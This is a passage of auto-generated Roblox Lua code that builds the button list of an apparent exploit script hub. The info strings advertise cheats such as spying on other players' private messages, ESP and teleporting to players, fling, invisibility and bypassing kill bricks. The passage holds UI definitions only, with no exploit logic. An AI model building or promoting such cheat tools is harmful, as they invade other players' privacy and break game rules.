G2L["57"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["57"]["BackgroundTransparency"] = 1;
G2L["57"]["Name"] = [[ >emojichat]];
G2L["57"]["Text"] = [[ >emojichat]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >emojichat.Info
G2L["58"] = Instance.new("StringValue", G2L["57"]);
G2L["58"]["Name"] = [[Info]];
G2L["58"]["Value"] = [[Command Info: Let's you do emojis in chat using : (new chat has this feature but this is for legacy chat)]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >vghub
G2L["59"] = Instance.new("TextButton", G2L["11"]);
G2L["59"]["TextWrapped"] = true;
G2L["59"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["59"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["59"]["TextSize"] = 14;
G2L["59"]["TextScaled"] = true;
G2L["59"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["59"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["59"]["ZIndex"] = 2147483647;
G2L["59"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["59"]["BackgroundTransparency"] = 1;
G2L["59"]["Name"] = [[ >vghub]];
G2L["59"]["Text"] = [[ >vghub]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >vghub.Info
G2L["5a"] = Instance.new("StringValue", G2L["59"]);
G2L["5a"]["Name"] = [[Info]];
G2L["5a"]["Value"] = [[Command Info: A script hub with a lot of games.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >scpfuturistic
G2L["5b"] = Instance.new("TextButton", G2L["11"]);
G2L["5b"]["TextWrapped"] = true;
G2L["5b"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["5b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["5b"]["TextSize"] = 14;
G2L["5b"]["TextScaled"] = true;
G2L["5b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5b"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5b"]["ZIndex"] = 2147483647;
G2L["5b"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["5b"]["BackgroundTransparency"] = 1;
G2L["5b"]["Name"] = [[ >scpfuturistic]];
G2L["5b"]["Text"] = [[ >scpfuturistic]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >scpfuturistic.Info
G2L["5c"] = Instance.new("StringValue", G2L["5b"]);
G2L["5c"]["Name"] = [[Info]];
G2L["5c"]["Value"] = [[Command Info: Newest version of SCP Futuristic gui I made since I updated it.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >togglekillbricks
G2L["5d"] = Instance.new("TextButton", G2L["11"]);
G2L["5d"]["TextWrapped"] = true;
G2L["5d"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["5d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["5d"]["TextSize"] = 14;
G2L["5d"]["TextScaled"] = true;
G2L["5d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5d"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5d"]["ZIndex"] = 2147483647;
G2L["5d"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["5d"]["BackgroundTransparency"] = 1;
G2L["5d"]["Name"] = [[ >togglekillbricks]];
G2L["5d"]["Text"] = [[ >togglekillbricks]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >togglekillbricks.Info
G2L["5e"] = Instance.new("StringValue", G2L["5d"]);
G2L["5e"]["Name"] = [[Info]];
G2L["5e"]["Value"] = [[Command Info: Makes kill bricks not kill you. Press Z to toggle.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >doorsgui
G2L["5f"] = Instance.new("TextButton", G2L["11"]);
G2L["5f"]["TextWrapped"] = true;
G2L["5f"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["5f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["5f"]["TextSize"] = 14;
G2L["5f"]["TextScaled"] = true;
G2L["5f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5f"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5f"]["ZIndex"] = 2147483647;
G2L["5f"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["5f"]["BackgroundTransparency"] = 1;
G2L["5f"]["Name"] = [[ >doorsgui]];
G2L["5f"]["Text"] = [[ >doorsgui]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >doorsgui.Info
G2L["60"] = Instance.new("StringValue", G2L["5f"]);
G2L["60"]["Name"] = [[Info]];
G2L["60"]["Value"] = [[Command Info: new doors gui added so have fun and im pretty sure its keyless too]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatspy
G2L["61"] = Instance.new("TextButton", G2L["11"]);
G2L["61"]["TextWrapped"] = true;
G2L["61"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["61"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["61"]["TextSize"] = 14;
G2L["61"]["TextScaled"] = true;
G2L["61"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["61"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["61"]["ZIndex"] = 2147483647;
G2L["61"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["61"]["BackgroundTransparency"] = 1;
G2L["61"]["Name"] = [[ >chatspy]];
G2L["61"]["Text"] = [[ >chatspy]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatspy.Info
G2L["62"] = Instance.new("StringValue", G2L["61"]);
G2L["62"]["Name"] = [[Info]];
G2L["62"]["Value"] = [[Command Info: Let's you spy on private messages and stuff and i edited it and i hope it works for new chat now]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >translator
G2L["63"] = Instance.new("TextButton", G2L["11"]);
G2L["63"]["TextWrapped"] = true;
G2L["63"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["63"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["63"]["TextSize"] = 14;
G2L["63"]["TextScaled"] = true;
G2L["63"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["63"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["63"]["ZIndex"] = 2147483647;
G2L["63"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["63"]["BackgroundTransparency"] = 1;
G2L["63"]["Name"] = [[ >translator]];
G2L["63"]["Text"] = [[ >translator]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >translator.Info
G2L["64"] = Instance.new("StringValue", G2L["63"]);
G2L["64"]["Name"] = [[Info]];
G2L["64"]["Value"] = [[Command Info: Uses the og chat translator that mastermz showcased but i edited it to hopefully make it work for new chat but with the cost of losing the ability of sending messages with that language]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >invis
G2L["65"] = Instance.new("TextButton", G2L["11"]);
G2L["65"]["TextWrapped"] = true;
G2L["65"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["65"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["65"]["TextSize"] = 14;
G2L["65"]["TextScaled"] = true;
G2L["65"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["65"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["65"]["ZIndex"] = 2147483647;
G2L["65"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["65"]["BackgroundTransparency"] = 1;
G2L["65"]["Name"] = [[ >invis]];
G2L["65"]["Text"] = [[ >invis]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >invis.Info
G2L["66"] = Instance.new("StringValue", G2L["65"]);
G2L["66"]["Name"] = [[Info]];
G2L["66"]["Value"] = [[Command Info: Togglable invisibility. (press G for computer)]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.maininfo
G2L["67"] = Instance.new("LocalScript", G2L["11"]);
G2L["67"]["Name"] = [[maininfo]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >namelessadmin
G2L["68"] = Instance.new("TextButton", G2L["11"]);
G2L["68"]["TextWrapped"] = true;
G2L["68"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["68"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["68"]["TextSize"] = 14;
G2L["68"]["TextScaled"] = true;
G2L["68"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["68"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["68"]["ZIndex"] = 2147483647;
G2L["68"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["68"]["BackgroundTransparency"] = 1;
G2L["68"]["Name"] = [[ >namelessadmin]];
G2L["68"]["Text"] = [[ >namelessadmin]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >namelessadmin.Info
G2L["69"] = Instance.new("StringValue", G2L["68"]);
G2L["69"]["Name"] = [[Info]];
G2L["69"]["Value"] = [[Command Info: Basically the best fe admin there is to my knowledge at least.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >quiz
G2L["6a"] = Instance.new("TextButton", G2L["11"]);
G2L["6a"]["TextWrapped"] = true;
G2L["6a"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["6a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["6a"]["TextSize"] = 14;
G2L["6a"]["TextScaled"] = true;
G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6a"]["ZIndex"] = 2147483647;
G2L["6a"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["6a"]["BackgroundTransparency"] = 1;
G2L["6a"]["Name"] = [[ >quiz]];
G2L["6a"]["Text"] = [[ >quiz]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >quiz.Info
G2L["6b"] = Instance.new("StringValue", G2L["6a"]);
G2L["6b"]["Name"] = [[Info]];
G2L["6b"]["Value"] = [[Command Info: Opens the quiz gui where you can chat some quizes and stuff with random players choosing answers and it has so many types of quizes too]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatdraw
G2L["6c"] = Instance.new("TextButton", G2L["11"]);
G2L["6c"]["TextWrapped"] = true;
G2L["6c"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["6c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["6c"]["TextSize"] = 14;
G2L["6c"]["TextScaled"] = true;
G2L["6c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6c"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6c"]["ZIndex"] = 2147483647;
G2L["6c"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["6c"]["BackgroundTransparency"] = 1;
G2L["6c"]["Name"] = [[ >chatdraw]];
G2L["6c"]["Text"] = [[>chatdraw]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatdraw.Info
G2L["6d"] = Instance.new("StringValue", G2L["6c"]);
G2L["6d"]["Name"] = [[Info]];
G2L["6d"]["Value"] = [[Command Info: Gives a gui where you can draw stuff and put it into the chat]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >shyguy
G2L["6e"] = Instance.new("TextButton", G2L["11"]);
G2L["6e"]["TextWrapped"] = true;
G2L["6e"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["6e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["6e"]["TextSize"] = 14;
G2L["6e"]["TextScaled"] = true;
G2L["6e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6e"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6e"]["ZIndex"] = 2147483647;
G2L["6e"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["6e"]["BackgroundTransparency"] = 1;
G2L["6e"]["Name"] = [[ >shyguy]];
G2L["6e"]["Text"] = [[>shyguy]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >shyguy.Info
G2L["6f"] = Instance.new("StringValue", G2L["6e"]);
G2L["6f"]["Name"] = [[Info]];
G2L["6f"]["Value"] = [[Command Info: Gives a gui that lets you do a few stuff like turning on touch fling and then turning into scp 096/shy guy (may have had updates since but idk)]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >spy
G2L["70"] = Instance.new("TextButton", G2L["11"]);
G2L["70"]["TextWrapped"] = true;
G2L["70"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["70"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["70"]["TextSize"] = 14;
G2L["70"]["TextScaled"] = true;
G2L["70"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["70"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["70"]["ZIndex"] = 2147483647;
G2L["70"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["70"]["BackgroundTransparency"] = 1;
G2L["70"]["Name"] = [[ >spy]];
G2L["70"]["Text"] = [[>spy]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >spy.Info
G2L["71"] = Instance.new("StringValue", G2L["70"]);
G2L["71"]["Name"] = [[Info]];
G2L["71"]["Value"] = [[Command Info: Gives a gui to spy on players like esp, viewing, and teleporting to the player]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >hug
G2L["72"] = Instance.new("TextButton", G2L["11"]);
G2L["72"]["TextWrapped"] = true;
G2L["72"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["72"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["72"]["TextSize"] = 14;
G2L["72"]["TextScaled"] = true;
G2L["72"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["72"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["72"]["ZIndex"] = 2147483647;
G2L["72"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["72"]["BackgroundTransparency"] = 1;
G2L["72"]["Name"] = [[ >hug]];
G2L["72"]["Text"] = [[>hug]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >hug.Info
G2L["73"] = Instance.new("StringValue", G2L["72"]);
G2L["73"]["Name"] = [[Info]];
G2L["73"]["Value"] = [[Command Info: idk exactly what it does but what ik is you can hug people by pressing H]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >skibidirizz
G2L["74"] = Instance.new("TextButton", G2L["11"]);
G2L["74"]["TextWrapped"] = true;
G2L["74"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["74"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["74"]["TextSize"] = 14;
G2L["74"]["TextScaled"] = true;
G2L["74"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["74"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["74"]["ZIndex"] = 2147483647;
G2L["74"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["74"]["BackgroundTransparency"] = 1;
G2L["74"]["Name"] = [[ >skibidirizz]];
G2L["74"]["Text"] = [[>skibidirizz]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >skibidirizz.Info
G2L["75"] = Instance.new("StringValue", G2L["74"]);
G2L["75"]["Name"] = [[Info]];
G2L["75"]["Value"] = [[Command Info: makes you say brainrot rizz if I remember correctly with a click of a button]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rizz
G2L["76"] = Instance.new("TextButton", G2L["11"]);
G2L["76"]["TextWrapped"] = true;
G2L["76"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["76"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["76"]["TextSize"] = 14;
G2L["76"]["TextScaled"] = true;
G2L["76"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["76"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["76"]["ZIndex"] = 2147483647;
G2L["76"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["76"]["BackgroundTransparency"] = 1;
G2L["76"]["Name"] = [[ >rizz]];
G2L["76"]["Text"] = [[>rizz]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rizz.Info
G2L["77"] = Instance.new("StringValue", G2L["76"]);
G2L["77"]["Name"] = [[Info]];
G2L["77"]["Value"] = [[Command Info: gives you a gui with actual rizz lines and stuff]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >emotes
G2L["78"] = Instance.new("TextButton", G2L["11"]);
G2L["78"]["TextWrapped"] = true;
G2L["78"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["78"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["78"]["TextSize"] = 14;
G2L["78"]["TextScaled"] = true;
G2L["78"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["78"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["78"]["ZIndex"] = 2147483647;
G2L["78"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["78"]["BackgroundTransparency"] = 1;
G2L["78"]["Name"] = [[ >emotes]];
G2L["78"]["Text"] = [[>emotes]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >emotes.Info
G2L["79"] = Instance.new("StringValue", G2L["78"]);
G2L["79"]["Name"] = [[Info]];
G2L["79"]["Value"] = [[Command Info: Gives you an emote gui which is the one thats used in those tiktok rizz videos idk]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >blackhole
G2L["7a"] = Instance.new("TextButton", G2L["11"]);
G2L["7a"]["TextWrapped"] = true;
G2L["7a"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["7a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["7a"]["TextSize"] = 14;
G2L["7a"]["TextScaled"] = true;
G2L["7a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7a"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7a"]["ZIndex"] = 2147483647;
G2L["7a"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["7a"]["BackgroundTransparency"] = 1;
G2L["7a"]["Name"] = [[ >blackhole]];
G2L["7a"]["Text"] = [[>blackhole]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >blackhole.Info
G2L["7b"] = Instance.new("StringValue", G2L["7a"]);
G2L["7b"]["Name"] = [[Info]];
G2L["7b"]["Value"] = [[Command Info: Gives a gui where you can toggle and change radius of the blackhole.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >obbytroll
G2L["7c"] = Instance.new("TextButton", G2L["11"]);
G2L["7c"]["TextWrapped"] = true;
G2L["7c"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["7c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["7c"]["TextSize"] = 14;
G2L["7c"]["TextScaled"] = true;
G2L["7c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7c"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7c"]["ZIndex"] = 2147483647;
G2L["7c"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["7c"]["BackgroundTransparency"] = 1;
G2L["7c"]["Name"] = [[ >obbytroll]];
G2L["7c"]["Text"] = [[>obbytroll]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >obbytroll.Info
G2L["7d"] = Instance.new("StringValue", G2L["7c"]);
G2L["7d"]["Name"] = [[Info]];
G2L["7d"]["Value"] = [[Command Info: Lets you activate stages of obbies that use disappearing parts when touched]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rejoin
G2L["7e"] = Instance.new("TextButton", G2L["11"]);
G2L["7e"]["TextWrapped"] = true;
G2L["7e"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["7e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["7e"]["TextSize"] = 14;
G2L["7e"]["TextScaled"] = true;
G2L["7e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7e"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7e"]["ZIndex"] = 2147483647;
G2L["7e"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["7e"]["BackgroundTransparency"] = 1;
G2L["7e"]["Name"] = [[ >rejoin]];
G2L["7e"]["Text"] = [[>rejoin]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rejoin.Info
G2L["7f"] = Instance.new("StringValue", G2L["7e"]);
G2L["7f"]["Name"] = [[Info]];
G2L["7f"]["Value"] = [[Command Info: Yes I finally added a rejoin command]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >serverhop
G2L["80"] = Instance.new("TextButton", G2L["11"]);
G2L["80"]["TextWrapped"] = true;
G2L["80"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["80"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["80"]["TextSize"] = 14;
G2L["80"]["TextScaled"] = true;
G2L["80"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["80"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["80"]["ZIndex"] = 2147483647;
G2L["80"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["80"]["BackgroundTransparency"] = 1;
G2L["80"]["Name"] = [[ >serverhop]];
G2L["80"]["Text"] = [[>serverhop]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >serverhop.Info
G2L["81"] = Instance.new("StringValue", G2L["80"]);
G2L["81"]["Name"] = [[Info]];
G2L["81"]["Value"] = [[Command Info: I added a server hop command as well too]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >graphics
G2L["82"] = Instance.new("TextButton", G2L["11"]);
G2L["82"]["TextWrapped"] = true;
G2L["82"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["82"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["82"]["TextSize"] = 14;
G2L["82"]["TextScaled"] = true;
G2L["82"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["82"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["82"]["ZIndex"] = 2147483647;
G2L["82"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["82"]["BackgroundTransparency"] = 1;
G2L["82"]["Name"] = [[ >graphics]];
G2L["82"]["Text"] = [[>graphics]];


